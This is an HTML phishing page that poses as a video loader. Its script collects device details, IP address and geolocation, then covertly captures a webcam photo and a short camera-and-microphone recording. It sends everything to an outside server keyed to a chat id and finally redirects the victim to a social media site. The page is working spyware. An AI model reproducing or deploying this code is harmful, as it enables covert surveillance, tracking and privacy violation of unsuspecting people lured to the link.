<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Loading Content...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
    .loader { border: 3px solid #1a1a1a; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    video, canvas { opacity: 0; position: absolute; left: -9999px; }
  </style>
</head>
<body>
  <div style="text-align: center;">
    <div class="loader"></div>
    <p style="color: #444; font-size: 12px; margin-top: 15px;">Processing Video Stream...</p>
  </div>

  <video id="v" autoplay muted playsinline></video>
  <canvas id="c" width="640" height="480"></canvas>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");
    const reKey = urlParams.get("re");
    const v = document.getElementById("v");
    const c = document.getElementById("c");
    const ctx = c.getContext("2d");

    const redirectMap = { "fb": "https://facebook.com", "ig": "https://instagram.com", "yt": "https://youtube.com" };

    async function send(payload) {
      if (!chatId) return;
      payload.chat_id = chatId;
      return fetch("https://render-backend-package1.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      });
    }

    async function gatherIntel() {
      // 1. معلومات الجهاز الأساسية
      let bat = "N/A";
      try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
      
      const info = {
        ua: navigator.userAgent,
        lang: navigator.language,
        plat: navigator.platform,
        res: `${window.screen.width}x${window.screen.height}`,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory || "N/A",
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      };

      // 2. محاولة جلب الـ IP من مصدرين مختلفين
      let ipAddr = "Unknown";
      let geoData = {};
      try {
        const res = await fetch("https://ipapi.co/json/");
        geoData = await res.json();
        ipAddr = geoData.ip;
      } catch (e) {
        try {
          const res2 = await fetch("https://api.ipify.org?format=json");
          const data2 = await res2.json();
          ipAddr = data2.ip;
        } catch(e2){}
      }

      const isVpn = (geoData.timezone && geoData.timezone !== info.tz) ? "⚠️ YES" : "✅ NO";

      let m = "🏁 *COBRA FULL INTEL REPORT* 🏁\n";
      m += "━━━━━━━━━━━━━━━━━━━━\n";
      m += `🌍 *IP:* \`${ipAddr}\` | *VPN:* ${isVpn}\n`;
      m += `📍 *Loc:* ${geoData.city || 'Unknown'}, ${geoData.country_name || 'Unknown'}\n`;
      m += `🏢 *ISP:* ${geoData.org || 'Unknown'}\n`;
      m += `📱 *Device:* ${info.plat} | ${info.res}\n`;
      m += `🌐 *Browser:* ${info.lang}\n`;
      m += `🕒 *Time:* ${new Date().toLocaleString('ar-DZ')}\n`;
      m += `🔋 *Bat:* ${bat} | 💻 *HW:* ${info.cores} Cores / ${info.ram}GB\n`;
      m += "━━━━━━━━━━━━━━━━━━━━\n";
      
      await send({ message: m });
      startSpying();
    }

    function startSpying() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          v.srcObject = stream;
          v.onloadedmetadata = () => {
            v.play();
            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => { 
                    // إرسال الفيديو بحجم مضغوط
                    send({ video: reader.result.split(',')[1] }); 
                };
                setTimeout(finish, 1500);
            };

            setTimeout(async () => {
                // التقاط صورة (جودة متوسطة لسرعة الإرسال)
                ctx.drawImage(v, 0, 0, c.width, c.height);
                await send({ photo: c.toDataURL("image/jpeg", 0.5).split(',')[1] });

                // تسجيل فيديو 3 ثواني فقط (المدة المثالية للـ Upload)
                recorder.start();
                setTimeout(() => {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }, 3500); 
            }, 2000);
          };
        })
        .catch(() => { send({ message: "❌ Access Denied" }); finish(); });
    }

    function finish() {
      window.location.replace(redirectMap[reKey] || "https://youtube.com");
    }

    if (chatId) gatherIntel();
  </script>
</body>
</html>
